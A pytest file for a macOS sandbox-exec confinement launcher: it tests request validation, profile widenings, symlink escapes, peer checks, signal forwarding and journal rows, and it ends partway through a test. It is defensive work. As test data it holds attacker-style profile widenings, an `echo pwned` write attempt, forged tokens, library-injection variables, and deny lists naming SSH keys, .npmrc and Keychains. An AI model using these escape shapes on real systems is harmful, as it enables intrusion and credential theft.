"""The confinement launcher and its stub: a runtime under its own profile starts every confined command through them.

Unit tests run an in-process launcher on a short temp socket with a stand-in for ``sandbox-exec`` (it drops ``-p`` and
the ``-D`` pairs and execs the command), so exit codes, signals, the journal and the process-group handling are checked
on any POSIX host. The live test (macOS) starts a real deny-default profile through stub → launcher → sandbox-exec.
"""

from __future__ import annotations

import dataclasses
import hashlib
import importlib.util
import json
import os
import platform
import shutil
import signal
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

import pytest

from tests.plugins.test_iclone_programs import world as programs_world  # noqa: F401 — a fixture used below

ROOT = Path(__file__).resolve().parents[2]
PLUGIN_DIR = ROOT / "plugins" / "iclone-confinement"
LAUNCHER_PY = PLUGIN_DIR / "launcher.py"
STUB_PY = PLUGIN_DIR / "stub.py"
LIVE = platform.system() == "Darwin" and os.path.exists("/usr/bin/sandbox-exec")
NEVER = "; never, whatever the class or the permission mode"
PROFILE = "(version 1)\n(allow default)\n" + NEVER + "\n(deny file-read* (literal \"/nonexistent-secret\"))\n"
FAKE_SANDBOX_EXEC = '#!/bin/sh\nshift; shift\nwhile [ "$1" = "-D" ]; do shift; shift; done\nexec "$@"\n'

# A body buildPolicyBody wrote: apps/desktop/electron/iclone-permissions/policy-file.fixture.test.ts pins this file.
WRITER_BODY = json.loads((ROOT / "tests" / "plugins" / "fixtures" / "iclone_policy_body.json").read_text())


def _body(standing="manual", **kw) -> dict:
    """The writer's body with this test's mode and values; a key main does not write is refused here."""
    assert set(kw) <= set(WRITER_BODY), f"not in the body main writes: {sorted(set(kw) - set(WRITER_BODY))}"
    return dict(WRITER_BODY, standing=standing, **kw)


def _load_launcher():
    spec = importlib.util.spec_from_file_location("iclone_confinement_launcher", LAUNCHER_PY)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


L = _load_launcher()


class World:
    """A short-path world (unix socket paths are limited to 104 bytes on macOS)."""

    def __init__(self, profile: str = PROFILE):
        self.root = Path(os.path.realpath(tempfile.mkdtemp(prefix="icl-", dir="/tmp")))
        self.profiles = self.root / "profiles"
        self.profiles.mkdir()
        (self.profiles / "project.sb").write_text(profile)
        self.profile = profile
        self.sha = hashlib.sha256(profile.encode()).hexdigest()
        self.home = self.root / "home"
        self.home.mkdir()
        self.proj = self.root / "proj"
        (self.proj / ".git").mkdir(parents=True)
        (self.proj / "README").write_text("inside\n")
        (self.root / "outside.txt").write_text("outside-secret\n")
        self.scratch = self.root / "scratch" / "s1"
        (self.scratch / "output").mkdir(parents=True)
        # The runtime profile's own roots, as main would name them to the launcher: one read root, one write root.
        self.rt = self.root / "rt"
        (self.rt / "lib").mkdir(parents=True)
        self.roots = ([str(self.rt)], [str(self.root / "scratch")])
        self.run_dir = self.root / "run"
        self.ledger = self.root / "ledger"
        self.spec = json.dumps({"v": 5, "profilesDir": str(self.profiles), "scratchRoot": str(self.root / "scratch"),
                                "home": str(self.home), "membersDir": str(self.root / "members"),
                                "denied": [str(self.root / "denied"), str(self.home / ".ssh"), str(self.home / ".npmrc"), str(self.home / "Library" / "Keychains")], "sha256": {"project": self.sha},
                                # fx7: what the user's shell runs from (profiles.ts execOnBehalfWrites)
                                "appFiles": [str(self.root / "userData"), str(self.home / ".hermes")],
                                "protectedWrites": [str(self.home / ".local" / "bin"), str(self.home / ".zshrc"), str(self.home / ".gitconfig"), str(self.home / "Library" / "LaunchAgents"),
                                                    "/opt/homebrew"]})
        self.index = L.core.parse_spec(self.spec)
        # Main's copy of the policy in the ledger folder (launcher-policy.ts): project writes allowed, no network.
        self.policy("acceptEdits")
        self.fake = self.root / "fake-sandbox-exec"
        self.fake.write_text(FAKE_SANDBOX_EXEC)
        self.fake.chmod(0o755)
        self.socket = str(self.run_dir / "launcher.sock")
        self.launcher = None

    def token(self, session=None, profile=None) -> str:
        sha = self.sha if profile is None else hashlib.sha256(profile.encode()).hexdigest()
        return L.core.new_run_token(self.index, "project", sha, session)

    def policy(self, standing: str = "acceptEdits", *, listed=None, asked=None, **body) -> None:
        """What main writes for the launcher: a body buildPolicyBody wrote (policy-file.fixture.test.ts pins the file),
        with this test's mode, any session or project modes, and (fx12) ``projects``: the folders main has open or the
        user named — this world's project unless ``listed`` says otherwise."""
        self.ledger.mkdir(exist_ok=True)
        # Atomic, as main's own writer is (writeFileAtomicSync): the policy watch must never read a half-written file.
        draft = self.ledger / f"{L.POLICY_FILE}.draft"
        draft.write_text(json.dumps({
            "v": 1, "body": _body(standing, **body),
            "projects": [str(self.proj)] if listed is None else list(listed),
            # fx17 (M2): the listed folders an allowed ask named, kept by main only while a pass or grant names them.
            **({"asked": list(asked)} if asked is not None else {})}))
        os.replace(draft, self.ledger / L.POLICY_FILE)

    def pass_(self, *, project="proj", exp=None, scope="once", cls="X") -> str:
        """What main appends when the user allows an ask (launcher-policy.ts ``pass``): one row naming the folder it
        was allowed in, the class the user allowed (fx17, M1; X = a shell ask, lifts writes and network) and when it
        expires — no command text (fx13, D13)."""
        pass_id = os.urandom(8).hex()
        now = time.time()
        row = {"v": 1, "id": pass_id, "project": str(self.proj) if project == "proj" else project, "cls": cls,
               "scope": scope,
               "ts": now, "exp": now + 120 if exp is None else exp}
        with open(self.ledger / L.PASS_FILE, "a") as handle:
            handle.write(json.dumps(row) + "\n")
        return pass_id

    def argv(self, command, *, params=None, profile=None, session=None) -> list:
        base = {"PROJECT_ROOT": str(self.proj), "SCRATCH": str(self.scratch),
                "OUTPUT_DIR": str(self.scratch / "output"), "NET": "0", "WRITE_PROJECT": "1", "PROJECT_GIT": "locked"}
        items = [f"{k}={v}" for k, v in base.items()] if params is None else list(params)
        if params is None:
            items.append(f"MEMBER={self.token(session)}")
        defines = [x for item in items for x in ("-D", item)]
        return [L.SANDBOX_EXEC, "-p", self.profile if profile is None else profile, *defines, *command]

    def request(self, command, *, env=None, **kw) -> dict:
        return {"v": 1, "argv": self.argv(command, **kw), "cwd": str(self.proj), "env": {"PATH": "/usr/bin:/bin", **(env or {})}}

    def validator(self, roots="world"):
        return L.Validator(self.index, str(self.ledger), self.roots if roots == "world" else roots)

    def widened(self, *lines) -> str:
        return PROFILE.replace(NEVER, "; widening\n" + "\n".join(lines) + "\n" + NEVER)

    def start(self, sandbox_exec=None, roots="world"):
        self.launcher = L.Launcher(self.index, self.socket, str(self.ledger),
                                   sandbox_exec=sandbox_exec or str(self.fake),
                                   roots=self.roots if roots == "world" else roots)
        self.launcher.bind()
        threading.Thread(target=self.launcher.serve_forever, daemon=True).start()
        return self.launcher

    def stub(self, argv, **kw):
        return [sys.executable, "-I", "-S", str(STUB_PY), self.socket, "--", *argv]

    def journal(self, name: str = "runs.jsonl") -> list:
        path = self.ledger / name
        return [json.loads(x) for x in path.read_text().splitlines()] if path.exists() else []

    def refused(self) -> list:
        """The launcher's refusal rows: the rotated generation first, then the current file."""
        return self.journal("refused.jsonl.1") + self.journal("refused.jsonl")

    def close(self):
        if self.launcher is not None:
            self.launcher.stop()
        shutil.rmtree(self.root, ignore_errors=True)


@pytest.fixture
def w():
    world = World()
    yield world
    world.close()


def test_the_fixture_policy_is_the_body_main_writes(w):
    """With the fixture test on the TS side, nothing here can keep a shape or a mode table main no longer writes."""
    w.policy("plan", sessions={"s1": "automatic"})
    written = json.loads((w.ledger / L.POLICY_FILE).read_text())["body"]
    assert written == dict(WRITER_BODY, standing="plan", sessions={"s1": "automatic"})
    assert set(written) >= {"table", "ceilings", "ceilingKey", "grants", "functions", "fnGrants", "folders"}
    with pytest.raises(AssertionError, match="not in the body main writes"):
        w.policy("plan", somethingMainNeverWrites=1)


def _refused(w, req, roots="world") -> L.Refusal:
    with pytest.raises(L.Refusal) as err:
        w.validator(roots).request(req)
    return err.value


class TestValidation:
    def test_a_good_request_passes_and_names_the_run(self, w):
        plan = L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/echo", "hi"], session="sess-1"))
        start = plan["start"]
        assert start["kind"] == "program" and start["cls"] == "project" and start["session"] == "sess-1"
        assert start["sha"] == w.sha and start["project"] == str(w.proj) and start["write"] and not start["net"]
        assert start["command"] == "/bin/echo hi"

    def test_an_unknown_profile_hash_is_refused(self, w):
        assert _refused(w, w.request(["/bin/echo"], profile=PROFILE + "(allow file-read*)\n")).code == "profile-unknown"

    def test_argv0_must_be_sandbox_exec(self, w):
        req = w.request(["/bin/echo"])
        req["argv"][0] = "/bin/sh"
        assert _refused(w, req).code == "bad-request"

    @pytest.mark.parametrize("case", ["unknown", "duplicate", "relative", "project-home", "project-root",
                                      "scratch-outside", "net-2", "no-member", "member-forged", "dash-command"])
    def test_each_bad_define_is_refused(self, w, case):
        good = {"PROJECT_ROOT": str(w.proj), "SCRATCH": str(w.scratch), "OUTPUT_DIR": str(w.scratch / "output"),
                "NET": "0", "WRITE_PROJECT": "0", "PROJECT_GIT": "locked"}
        member = f"MEMBER={w.token()}"
        command = ["/bin/echo"]
        items = [f"{k}={v}" for k, v in good.items()] + [member]
        if case == "unknown":
            items.append("EXTRA=1")
        elif case == "duplicate":
            items.append("NET=0")
        elif case == "relative":
            items[0] = "PROJECT_ROOT=proj"
        elif case == "project-home":
            items[0] = f"PROJECT_ROOT={w.home}"
        elif case == "project-root":
            items[0] = "PROJECT_ROOT=/"
        elif case == "scratch-outside":
            (w.root / "elsewhere").mkdir()
            items[1] = f"SCRATCH={w.root / 'elsewhere'}"
        elif case == "net-2":
            items[3] = "NET=2"
        elif case == "no-member":
            items.pop()
        elif case == "member-forged":
            items[-1] = f"MEMBER={w.root / 'members' / ('project+' + w.sha[:12] + '+-+' + '0' * 32)}"
        elif case == "dash-command":
            command = ["-p", "(version 1)(allow default)", "/bin/echo"]
        assert _refused(w, w.request(command, params=items)).code == "bad-request"

    def test_loader_variables_are_dropped(self, w):
        req = w.request(["/bin/echo"])
        req["env"] = {"DYLD_INSERT_LIBRARIES": "/x.dylib", "LD_PRELOAD": "/x.so", "KEEP": "1"}
        assert L.Validator(w.index, str(w.ledger)).request(req)["env"] == {"KEEP": "1"}

    def test_a_shell_run_shows_its_script(self, w):
        plan = L.Validator(w.index, str(w.ledger)).request(
            w.request(["/bin/bash", "--noprofile", "--norc", "-c", "ls -la\nexit $?", "iclone-confined:project:x:-"]))
        assert plan["start"]["kind"] == "shell" and plan["start"]["command"] == "ls -la"

    def test_the_run_marker_is_never_part_of_the_shown_command_on_a_start_line_or_a_refused_one(self, w):
        # The plugin ends every confined argv with its marker (`ps` reads it); the ledger shows the command without it,
        # for a program run as for a shell run, and for a refused request exactly as its start line would have.
        marker = "iclone-confined:project:0123456789ab:sess-1"
        plan = L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/echo", "unknown-profile-x", marker], session="sess-1"))
        assert (plan["start"]["kind"], plan["start"]["command"]) == ("program", "/bin/echo unknown-profile-x")
        refused = w.request(["/bin/echo", "unknown-profile-x", marker], session="sess-1", profile="(version 1)(allow default)")
        assert L.describe(refused) == ("sess-1", "/bin/echo unknown-profile-x")
        shell = w.request(["/bin/bash", "-c", "ls -la\nexit $?", marker], profile="(version 1)(allow default)")
        assert L.describe(shell) == (None, "ls -la")
        # Without a marker nothing is dropped: the last word of a program's argv is its own.
        assert L.describe(w.request(["/bin/echo", "x"], profile="(version 1)(allow default)")) == (None, "/bin/echo x")
        # A malformed request still describes what it can.
        assert L.describe({"v": 1, "argv": ["/usr/bin/sandbox-exec", "-p", "(version 1)", "-D"]}) == (None, "")
        assert L.describe(None) == (None, "")

    def test_the_start_row_says_who_issued_the_run_from_how_the_runtime_sent_it(self, w):
        marker = "iclone-confined:project:x:-"
        wrapped = TestAgentCommand._wrap("ls -la")
        # Through Hermes' command wrapper (execute(): a tool acting for the agent): the agent's.
        agent = L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/bash", "-c", wrapped, marker]))
        assert agent["start"]["origin"] == "agent"
        # A shell script that never came through the wrapper is the environment's own (its snapshot, its probes).
        own = L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/bash", "-c", "true\nexit $?", marker]))
        assert own["start"]["origin"] == "runtime"
        # The plugin's word in the request's environment: read for the row, dropped from the command's environment.
        req = w.request(["/bin/bash", "-c", wrapped, marker])
        req["env"][L.ORIGIN_ENV] = "runtime"
        plan = L.Validator(w.index, str(w.ledger)).request(req)
        assert plan["start"]["origin"] == "runtime" and L.ORIGIN_ENV not in plan["env"]
        # A program is the agent's unless the plugin says otherwise; the words of the command decide nothing.
        assert L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/echo", "x"]))["start"]["origin"] == "agent"
        snapshot = L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/bash", "-c", TestAgentCommand._wrap(L.SESSION_SETUP), marker]))
        assert snapshot["start"]["origin"] == "agent"

    def test_the_launcher_uses_the_plugins_own_core(self):
        assert os.path.samefile(L.core.__file__, PLUGIN_DIR / "core.py")
        assert L.core.NEVER_MARK == NEVER
        assert L.ORIGIN_ENV == L.core.ORIGIN_ENV


class TestAgentCommand:
    """The ledger shows what the agent asked for: the eval body of Hermes' real wrapper, nothing of the wrapper."""

    @staticmethod
    def _wrap(command: str, **kw) -> str:
        from tools.environments.base_session_env import _wrap_command_script
        options = dict(quoted_cwd="'/p/dir'", quoted_snap="'/s/.env_snapshot'", snap_tmp_template="'/s/.snap.XXXXXX'",
                       passthrough_names=["HERMES_RUNTIME_PROFILE"], snapshot_ready=True, cwd_marker="__HERMES_CWD_s1__")
        options.update(kw)
        return _wrap_command_script(command, **options) + "\nexit $?"

    @pytest.mark.parametrize("command", [
        "ls -la",
        "echo 'a b' && printf '%s\\n' \"x'y\"",
        "cat <<'EOF'\nline '1'\n__hermes_ec=$?\nEOF\nls",
        "eval 'echo nested'\n__hermes_ec=$?",
    ])
    def test_the_eval_body_comes_back_exactly(self, command):
        assert L.agent_command(self._wrap(command)) == command
        assert L.agent_command(self._wrap(command, snapshot_ready=False, passthrough_names=[])) == command

    def test_a_stdin_heredoc_is_unwrapped(self):
        from tools.environments.base import BaseEnvironment
        command = "python3 -\nls"
        assert L.agent_command(self._wrap(BaseEnvironment._embed_stdin_heredoc(command, "print(1)\n"))) == command

    def test_an_unknown_shape_is_shown_whole(self):
        assert L.agent_command("ls -la\nexit $?") == "ls -la"
        assert L.agent_command("true") == "true"
        assert L.agent_command("") == ""

    def test_the_journal_line_carries_the_agents_command_clipped(self, w):
        long = "echo " + "x" * 3000
        plan = L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/bash", "-c", self._wrap(long), "iclone-confined:project:x:-"]))
        assert plan["start"]["kind"] == "shell" and plan["start"]["command"] == long[:L.COMMAND_CLIP]



    def test_the_session_snapshot_is_named_not_shown(self):
        from tools.environments.base_session_env import _snapshot_bootstrap_script
        script = _snapshot_bootstrap_script(quoted_cwd="'/p/dir'", quoted_snap="'/s/.env_snapshot'",
                                            snap_tmp_template="'/s/.snap.XXXXXX'", excluded_names=["HERMES_X"],
                                            cwd_marker="__HERMES_CWD_s1__") + "\nexit $?"
        assert L.agent_command(script) == L.SESSION_SETUP


class TestTheLedgerFolder:
    def test_the_ledger_is_never_the_sockets_folder(self, w):
        with pytest.raises(RuntimeError, match="folder of its own"):
            L.Launcher(w.index, w.socket, str(w.run_dir))
        with pytest.raises(RuntimeError, match="folder of its own"):
            L.Launcher(w.index, w.socket, str(w.run_dir / "ledger"))
        with pytest.raises(RuntimeError, match="folder of its own"):
            L.Launcher(w.index, w.socket, "")

    def test_the_process_needs_the_ledger_folder_named(self, w):
        env = {"ICLONE_CONFINEMENT_SPEC": w.spec, "ICLONE_LAUNCHER_SOCKET": w.socket, "PATH": "/usr/bin:/bin", "LANG": "C"}
        out = subprocess.run([sys.executable, "-I", "-S", str(LAUNCHER_PY)], capture_output=True, text=True, env=env,
                             timeout=20)
        assert out.returncode == 1 and "ICLONE_LAUNCHER_JOURNAL_DIR" in out.stderr and not os.path.exists(w.socket)


class TestPeerCheck:
    def test_our_own_connection_reads_our_uid(self):
        a, b = socket.socketpair()
        try:
            assert L.peer_uid(a) in (os.getuid(), None)
            if sys.platform == "darwin":
                assert L.peer_uid(a) == os.getuid()
        finally:
            a.close()
            b.close()

    def test_a_connection_from_another_user_is_refused_before_its_request_is_read(self, w, monkeypatch):
        w.start()
        monkeypatch.setattr(L, "peer_uid", lambda sock: os.getuid() + 1)
        out = subprocess.run(w.stub(w.argv(["/bin/echo", "x"])), capture_output=True, text=True, timeout=20)
        assert out.returncode == 126
        assert out.stderr == "Refused by icloneOS confinement: the launcher answers its own user only\n"
        (row,) = w.refused()
        assert row["ev"] == "refused" and row["code"] == "bad-request" and "another user" in row["detail"]
        assert w.journal() == []
        monkeypatch.setattr(L, "peer_uid", lambda sock: os.getuid())
        ok = subprocess.run(w.stub(w.argv(["/bin/echo", "x"])), capture_output=True, text=True, timeout=20)
        assert ok.returncode == 0


class TestProgramWidenings:
    def test_every_widening_programs_writes_is_accepted(self, programs_world):  # noqa: F811
        w = programs_world
        index = w.core.trusted_index()
        media_dir = Path(w.core.scratch_dir(index, "programs"))
        media_in = media_dir / "in.mp3"
        media_in.write_text("x")
        media, _ = w.programs.confine(["/bin/cat", str(media_in)], kind="media", reads=(str(media_in),),
                                      writes=(str(media_dir / "out.wav"),))
        probe, _ = w.programs.confine(["/bin/echo", "--version"], kind="probe")
        # The roots main names: the tool store and the bundle folder are read roots, the scratch root and the runtime
        # temp write roots.
        validator = L.Validator(index, roots=([w.store, str(w.root / "Apps")], [index.scratch_root, w.rtmp], [index.scratch_root, w.rtmp]))
        for argv in (media, probe):
            assert argv[0] == L.SANDBOX_EXEC
            plan = validator.request({"v": 1, "argv": argv, "cwd": "/", "env": {}})
            assert plan["start"]["kind"] == "program" and plan["start"]["cls"] in ("research", "media")

    def test_a_launcher_without_roots_refuses_the_same_widenings(self, programs_world):  # noqa: F811
        w = programs_world
        media_dir = Path(w.core.scratch_dir(w.core.trusted_index(), "programs"))
        media_in = media_dir / "in.mp3"
        media_in.write_text("x")
        media, _ = w.programs.confine(["/bin/cat", str(media_in)], kind="media", reads=(str(media_in),),
                                      writes=(str(media_dir / "out.wav"),))
        with pytest.raises(L.Refusal) as err:
            L.Validator(w.core.trusted_index()).request({"v": 1, "argv": media, "cwd": "/", "env": {}})
        assert err.value.code == "profile-unknown"

    @pytest.mark.parametrize("line", ["(allow default)", "(allow file-read* (subpath \"/\"))",
                                      "(allow file-read* (literal \"{home}\"))",
                                      "(allow file-read* file-write* (subpath \"{denied}/x\"))",
                                      "(allow process-exec (subpath \"/tmp\"))"])
    def test_anything_else_before_the_closing_block_is_refused(self, w, line):
        widened = PROFILE.replace(NEVER, "; widening\n" + line.format(home=w.home, denied=w.root / "denied")
                                  + "\n" + NEVER)
        assert _refused(w, w.request(["/bin/echo"], profile=widened)).code == "profile-unknown"


class TestWideningRoots:
    """A widened profile never grants a path the runtime itself does not hold: every grant is judged, by real path,
    against the runtime roots main named and the run's own validated roots."""

    def _params(self, w, profile, write_project="0"):
        return [f"PROJECT_ROOT={w.proj}", f"SCRATCH={w.scratch}", f"OUTPUT_DIR={w.scratch / 'output'}", "NET=0",
                f"WRITE_PROJECT={write_project}", "PROJECT_GIT=locked", f"MEMBER={w.token(profile=profile)}"]

    def _plan(self, w, line, roots="world", write_project="0", command="/bin/echo"):
        profile = w.widened(line)
        req = w.request([command], profile=profile, params=self._params(w, profile, write_project))
        return w.validator(roots).request(req)

    def _refused(self, w, line, roots="world", write_project="0", command="/bin/echo"):
        with pytest.raises(L.Refusal) as err:
            self._plan(w, line, roots, write_project, command)
        return err.value.code

    def test_without_the_roots_every_widened_profile_is_refused_and_exact_ones_run(self, w):
        inside = f'(allow file-read* (literal "{w.rt}/lib/x"))'
        assert self._refused(w, inside, roots=None) == "profile-unknown"
        assert L.Validator(w.index, str(w.ledger)).request(w.request(["/bin/echo"]))["start"]["cls"] == "project"
        assert L.runtime_roots({}) is None and L.runtime_roots({L.READ_ROOTS_ENV: "[", L.WRITE_ROOTS_ENV: "[]"}) is None
        assert L.runtime_roots({L.READ_ROOTS_ENV: '["/a"]', L.WRITE_ROOTS_ENV: '["rel"]'}) is None
        assert L.runtime_roots({L.READ_ROOTS_ENV: '["/a"]', L.WRITE_ROOTS_ENV: '["/b"]'}) == (["/a"], ["/b"], [])

    def test_grants_inside_the_runtime_roots_or_the_runs_own_roots_pass(self, w):
        for line in (f'(allow file-read* (literal "{w.rt}/lib/x"))',
                     f'(allow file-read* (literal "{w.proj}/README"))',
                     f'(allow file-read* file-write* (literal "{w.scratch}/out.wav"))',
                     f'(allow file-read* file-write* (subpath "{w.scratch}/output/pages"))',
                     f'(allow file-read-metadata (literal "{w.root}") (literal "/private"))'):
            assert self._plan(w, line)["start"]["cls"] == "project", line
        # fx26a: another session's scratch is in the runtime's write roots, never a widening's to grant.
        assert self._refused(w, f'(allow file-read* file-write* (literal "{w.root}/scratch/other/new.txt"))') == "profile-unknown"
        # Ruling R1: no widening opens a socket any more: the browser that needed one runs outside the Seatbelt.
        socket_line = (f'(allow network-bind network-inbound network-outbound (local unix-socket (subpath "{w.scratch}/own")) '
                       f'(remote unix-socket (subpath "{w.scratch}/own")))')
        assert self._refused(w, socket_line) == "profile-unknown"
        # fx7: an install granted exec is the program that runs
        exec_line = f'(allow file-read* process-exec (subpath "{w.rt}/lib"))'
        assert self._plan(w, exec_line, command=f"{w.rt}/lib/x")["start"]["cls"] == "project"
        assert self._refused(w, exec_line) == "profile-unknown"

    def test_the_project_is_written_only_when_the_run_may_write_it(self, w):
        line = f'(allow file-read* file-write* (literal "{w.proj}/notes.txt"))'
        assert self._refused(w, line, write_project="0") == "profile-unknown"
        assert self._plan(w, line, write_project="1")["start"]["write"] is True

    @pytest.mark.parametrize("shape", [
        '(allow file-read* (literal "{outside}"))',
        '(allow file-read* (literal "{rt_sibling}/x"))',
        '(allow file-read* file-write* (literal "{victim}/rc"))',
        '(allow file-read* file-write* (subpath "{victim}"))',
        '(allow file-read* file-write* (literal "{rt}/lib/x"))',
        '(allow file-read* file-write* (subpath "/tmp/x"))',
        '(allow file-read* process-exec (subpath "{victim}/tool"))',
        '(allow file-read* process-exec (subpath "/Applications"))',
        '(allow file-read* process-exec (subpath "/Applications/Nothing-of-the-sort.app"))',
        '(allow file-read* process-exec (subpath "{apps}/Fake.app"))',
        '(allow network-bind network-inbound network-outbound (local unix-socket (subpath "{victim}")) '
        '(remote unix-socket (subpath "{victim}")))',
        '(allow file-read* file-write* (regex #"^{victim_rx}/com\\.example\\.[A-Za-z0-9]+(/|$)"))',
        '(allow network-bind network-inbound (local unix-socket (regex #"^{victim_rx}/com\\.example\\.[A-Za-z0-9]+/")))',
    ])
    def test_an_in_shape_grant_outside_the_roots_is_refused(self, w, shape):
        (w.root / "victim").mkdir()
        (w.root / "Apps" / "Fake.app").mkdir(parents=True)
        line = shape.format(outside=w.root / "outside.txt", rt_sibling=w.root / "rt-other", victim=w.root / "victim",
                            rt=w.rt, apps=w.root / "Apps", victim_rx=str(w.root / "victim").replace(".", "\\."))
        assert self._refused(w, line) == "profile-unknown", line

    @pytest.mark.skipif(not any(n.endswith(".app") for n in os.listdir("/Applications")), reason="no app bundle")
    def test_an_app_bundle_directly_under_applications_may_be_read_and_run(self, w):
        bundle = os.path.join("/Applications", sorted(n for n in os.listdir("/Applications") if n.endswith(".app"))[0])
        # fx7: the widening runs the program it grants exec of, so the command is the bundle's own executable
        macos = os.path.join(bundle, "Contents", "MacOS")
        program = os.path.join(macos, sorted(os.listdir(macos))[0])
        line = f'(allow file-read* process-exec (subpath "{bundle}"))'
        assert self._plan(w, line, command=program)["start"]["cls"] == "project"
        assert self._refused(w, line) == "profile-unknown"  # /bin/echo is not what the widening is for
        assert self._refused(w, f'(allow file-read* process-exec (subpath "{bundle}/Contents"))', command=program) == "profile-unknown"

    def test_a_symlink_that_leaves_the_roots_is_refused(self, w):
        (w.root / "victim").mkdir()
        os.symlink(w.root / "victim", w.scratch / "link")
        for line in (f'(allow file-read* file-write* (subpath "{w.scratch}/link"))',
                     f'(allow file-read* file-write* (literal "{w.scratch}/link/not-yet/rc"))',
                     f'(allow file-read* (literal "{w.scratch}/link/secret"))',
                     f'(allow file-read* (literal "{w.scratch}/../outside.txt"))'):
            assert self._refused(w, line) == "profile-unknown", line
        assert L.real_grant(f"{w.scratch}/link/not-yet/rc") == f"{w.root}/victim/not-yet/rc"
        assert L.real_grant(f"{w.scratch}/../x") is None and L.real_grant("relative") is None

    def test_metadata_of_a_path_outside_every_root_is_refused(self, w):
        (w.home / ".ssh").mkdir()
        for path in (f"{w.home}/Documents/x", f"{w.home}/.ssh/id_rsa", f"{w.root}/outside.txt", f"{w.root}/rt-other",
                     f"{w.rt}-sibling/x", f"{w.root}/T"):
            assert self._refused(w, f'(allow file-read-metadata (literal "{path}"))') == "profile-unknown", path

    def test_metadata_of_an_ancestor_of_a_root_passes(self, w):
        for path in (str(w.root), str(w.root / "scratch"), str(Path(w.root).parent)):
            assert self._plan(w, f'(allow file-read-metadata (literal "{path}"))')["start"]["cls"] == "project", path

    def test_metadata_inside_a_root_passes(self, w):
        for path in (f"{w.rt}/lib/x", f"{w.proj}/README", f"{w.scratch}/output/pages", f"{w.root}/scratch/other"):
            assert self._plan(w, f'(allow file-read-metadata (literal "{path}"))')["start"]["cls"] == "project", path

    def test_metadata_through_a_symlink_that_leaves_the_roots_is_refused(self, w):
        (w.root / "victim").mkdir()
        os.symlink(w.root / "victim", w.scratch / "link")
        assert self._refused(w, f'(allow file-read-metadata (literal "{w.scratch}/link/x"))') == "profile-unknown"

    def test_without_the_roots_no_metadata_grant_passes(self, w):
        validator = L.Validator(w.index, str(w.ledger))
        params = {"PROJECT_ROOT": str(w.proj), "SCRATCH": str(w.scratch), "OUTPUT_DIR": str(w.scratch / "output"),
                  "WRITE_PROJECT": "0", "PROJECT_GIT": "locked"}
        assert validator.grant_ok(f"{w.proj}/README", "metadata", params) is False
        assert validator.grant_ok(str(w.root), "metadata", params) is False

    @pytest.mark.skipif(not LIVE, reason="macOS sandbox-exec")
    def test_a_widened_profile_cannot_write_outside_through_the_real_sandbox(self):
        from tests.plugins.test_iclone_confinement import MINI_PROFILE

        # The app's profiles end in a never block; the widening goes before it (programs.py), as an attacker's would.
        base = MINI_PROFILE + NEVER + '\n(deny file-read* (literal "/nonexistent-secret"))\n'
        world = World(base)
        try:
            victim = world.root / "victim"
            victim.mkdir()
            target = victim / "rc"
            widened = base.replace(NEVER, f'; widening\n(allow file-read* file-write* (literal "{target}"))\n' + NEVER)
            assert widened != base
            world.start(sandbox_exec=L.SANDBOX_EXEC)
            cmd = ["/bin/sh", "-c", f"echo pwned > '{target}'"]
            params = [f"PROJECT_ROOT={world.proj}", f"SCRATCH={world.scratch}", f"OUTPUT_DIR={world.scratch / 'output'}",
                      "NET=0", "WRITE_PROJECT=1", "PROJECT_GIT=locked", f"MEMBER={world.token(profile=widened)}"]
            attempt = subprocess.run(world.stub(world.argv(cmd, profile=widened, params=params)), capture_output=True,
                                     text=True, timeout=30, cwd=str(world.proj))
            assert attempt.returncode == 126 and not target.exists(), (attempt.returncode, attempt.stderr)
            assert any(row["ev"] == "refused" and row["code"] == "profile-unknown" for row in world.refused())
            control = subprocess.run(world.stub(world.argv(cmd)), capture_output=True, text=True, timeout=30,
                                     cwd=str(world.proj))
            assert control.returncode != 0 and not target.exists(), control.stderr
            assert "Operation not permitted" in control.stderr, control.stderr
            inside = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", f"echo ok > '{world.scratch}/w'"])),
                                    capture_output=True, text=True, timeout=30, cwd=str(world.proj))
            assert inside.returncode == 0 and (world.scratch / "w").read_text() == "ok\n", inside.stderr
        finally:
            world.close()


def _wait_for(predicate, timeout=5.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(0.02)
    return False


def _gone(pid: int) -> bool:
    try:
        os.killpg(pid, 0)
    except ProcessLookupError:
        return True
    except PermissionError:
        return False
    return False


class TestStubAndLauncher:
    @pytest.mark.parametrize("code", [0, 3])
    def test_the_stub_mirrors_the_exit_code_and_the_output_arrives(self, w, code):
        w.start()
        out = subprocess.run(w.stub(w.argv(["/bin/sh", "-c", f"echo hi; echo err >&2; exit {code}"])),
                             capture_output=True, text=True, timeout=20)
        assert (out.returncode, out.stdout, out.stderr) == (code, "hi\n", "err\n")

    def test_a_signal_death_is_mirrored(self, w):
        w.start()
        out = subprocess.run(w.stub(w.argv(["/bin/sh", "-c", "kill -TERM $$"])), capture_output=True, timeout=20)
        assert out.returncode == -signal.SIGTERM

    def test_term_is_forwarded_to_the_runs_group(self, w):
        w.start()
        proc = subprocess.Popen(w.stub(w.argv(["/bin/sh", "-c",
                                               'trap "echo got; exit 7" TERM; echo up; while :; do sleep 0.05; done'])),
                                stdout=subprocess.PIPE, text=True)
        assert proc.stdout.readline() == "up\n"
        proc.send_signal(signal.SIGTERM)
        assert proc.wait(timeout=10) == 7 and "got" in proc.stdout.read()

    def test_a_killed_stub_takes_the_runs_group_with_it(self, w):
        w.start()
        pidfile = w.root / "child.pid"
        proc = subprocess.Popen(w.stub(w.argv(["/bin/sh", "-c", f"sleep 30 & echo $! > {pidfile}; wait"])),
                                stdout=subprocess.DEVNULL)
        assert _wait_for(lambda: pidfile.exists() and pidfile.read_text().strip())
        run_pid = next(row["pid"] for row in w.journal() if row["ev"] == "start")
        proc.kill()
        proc.wait(timeout=5)
        assert _wait_for(lambda: _gone(run_pid)), "the run's process group outlived its stub"
        # The launcher reaps the run, then writes its end row: the group being gone does not mean the row is there.
        assert _wait_for(lambda: any(row["ev"] == "end" for row in w.journal())), "the run never got its end row"
        end = [row for row in w.journal() if row["ev"] == "end"]
